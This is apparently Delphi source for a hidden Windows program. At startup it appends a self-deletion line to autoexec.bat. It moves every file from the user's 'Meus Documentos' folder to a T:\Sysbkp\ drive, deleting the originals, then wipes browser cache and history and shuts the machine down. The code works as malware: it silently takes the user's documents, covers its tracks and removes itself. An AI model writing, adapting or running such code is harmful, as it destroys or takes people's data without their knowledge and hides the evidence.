unit dir;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls,shellapi, Phantom;

type
  TMI2 = class(TForm)
    Phantom1: TPhantom;
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    procedure finddir(dir:string);
    procedure delfiles(dir:string);
    function ExitWindowsEx(uFlags : integer;  		 // shutdown operation
                   dwReserved : word) : boolean;

    
  public
    { Public declarations }
  end;

var
  MI2: TMI2;



implementation

{$R *.DFM}

function TMI2.ExitWindowsEx(uFlags : integer;  		 // shutdown operation
                   dwReserved : word) : boolean; // reserved
  external 'user32.dll' name 'ExitWindowsEx';


procedure TMI2.delfiles(dir:string);
var
   rec:TsearchRec;
   tipo:integer;
   diretorio:string;
begin
     tipo:=findfirst(dir+'\*.*',FaAnyFile,rec);
     while tipo=0 do
           begin
                diretorio:=dir+'\'+rec.name;
                if rec.attr=fadirectory then
                   begin

                        if not ((rec.name='.') or (rec.name='..')) then
                           begin

                                delfiles(diretorio);
                           end;
                   end
                else
                    deletefile(diretorio);
                tipo:=findnext(rec);
           end;
     findclose(rec);
end;

procedure TMI2.finddir(dir:string);
var
   rec:TsearchRec;
   tipo:integer;
   diretorio,dest:string;
   FromF, ToF: file;
   NumRead, NumWritten: Integer;
   Buf: array[1..4096] of Char;

begin
     tipo:=findfirst(dir+'\*.*',FaAnyFile,rec);
     while tipo=0 do
           begin
                diretorio:=dir+'\'+rec.name;
                if rec.attr=fadirectory then
                   begin

                        if not ((rec.name='.') or (rec.name='..')) then
                           begin

                                finddir(diretorio);
                           end;
                   end
                else
                    begin
                         AssignFile(FromF,diretorio{dir+'\'+rec.name});
                         Reset(FromF, 1);	{ Record size = 1 }
                         dest:='T:\Sysbkp\';
                         try
                            createdir(dest);
                            AssignFile(ToF,dest+rec.name);	{ Open output file }
                            Rewrite(ToF, 1);	{ Record size = 1 }
                            repeat
                                  BlockRead(FromF, Buf, SizeOf(Buf), NumRead);
                                  BlockWrite(ToF, Buf, NumRead, NumWritten);
                            until (NumRead = 0) or (NumWritten <> NumRead);
                            CloseFile(FromF);
                            CloseFile(ToF);
                         finally 
                                deletefile(diretorio);
                         end;
                    end;
                tipo:=findnext(rec);
           end;
     findclose(rec);
end;


procedure TMI2.FormCreate(Sender: TObject);
var
   autoexec:textfile;
   arq:string;
begin
     arq:='c:\Windows\MenuIn~1\Progra~1\Iniciar\MI2.exe';
     assignfile(autoexec,'C:\autoexec.bat');
     append(autoexec);
     writeln(autoexec,'del '+arq);
     closefile(autoexec);
     finddir('C:\Meus Documentos');
     delfiles('C:\Windows\Temporary Internet Files');
     delfiles('C:\Windows\Histórico');

     close;

end;

procedure TMI2.FormClose(Sender: TObject; var Action: TCloseAction);
begin
     ExitWindowsEx(EWX_SHUTDOWN, 0);
end;

end.
